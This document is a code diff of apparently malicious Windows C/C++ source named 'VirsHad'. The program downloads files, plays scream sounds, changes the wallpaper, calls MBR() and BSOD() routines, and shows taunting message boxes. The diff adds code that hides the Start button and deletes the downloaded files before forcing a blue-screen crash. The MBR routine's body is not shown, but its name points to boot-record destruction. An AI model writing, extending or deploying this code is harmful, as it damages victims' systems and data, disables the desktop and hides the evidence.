@@ -1,6 +1,7 @@
 ﻿#pragma comment(lib, "winmm.lib")
 #include "VirsHad.h"
 #include <Windows.h>
+#include <stdio.h>
 
 int MBR();
 int BSOD();
@@ -33,6 +34,11 @@ int loop(){
         char* str = "C:\\Users\\Public\\Downloads\\screamBG.bmp";
         SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
         PlaySound(L"C:\\Users\\Public\\Downloads\\scream.wav", NULL, SND_FILENAME);
+
+        remove("C:\\Users\\Public\\Downloads\\screamBG.bmp");
+        remove("C:\\Users\\Public\\Downloads\\scream.wav");
+        remove("C:\\Users\\Public\\Downloads\\WP.bmp");
+        remove("C:\\Users\\Public\\Downloads\\BG.wav");
         BSOD();
     }
     return 0;
@@ -47,15 +53,16 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR, int) {
 
     if (msgboxID == IDYES)
     {
-        int msgboxID = MessageBox(
-            NULL,
-            L"Wait fo downloadng files...\nPress OK to continue.",
-            L"Return the potatoes!",
-            MB_ICONEXCLAMATION | MB_OK);
+        HWND hTaskBar = FindWindow(L"Shell_TrayWnd", NULL);
+        HWND hStartButton = GetWindow(hTaskBar, GW_CHILD);
+        ShowWindow(hStartButton, SW_HIDE);
+
         Download();
-        PlaySound(L"C:\\Users\\Public\\Downloads\\BG.wav", NULL, SND_LOOP | SND_ASYNC);
+
         char* str = "C:\\Users\\Public\\Downloads\\WP.bmp";
+        PlaySound(L"C:\\Users\\Public\\Downloads\\BG.wav", NULL, SND_LOOP | SND_ASYNC);
         SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+
         MBR();
         loop();
     }
@@ -68,9 +75,20 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR, int) {
             MB_ICONEXCLAMATION | MB_OK);
 
         if (msgboxID == IDOK) {
+            int msgboxID = MessageBox(
+                NULL,
+                L"U stupid!",
+                L"HAHAHAHAHA!",
+                MB_ICONEXCLAMATION | MB_OK);
+
             char* str = "C:\\Users\\Public\\Downloads\\screamBG.bmp";
             SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
             PlaySound(L"C:\\Users\\Public\\Downloads\\scream.wav", NULL, SND_FILENAME);
+
+            remove("C:\\Users\\Public\\Downloads\\screamBG.bmp");
+            remove("C:\\Users\\Public\\Downloads\\scream.wav");
+            remove("C:\\Users\\Public\\Downloads\\WP.bmp");
+            remove("C:\\Users\\Public\\Downloads\\BG.wav");
             BSOD();
         }
     }
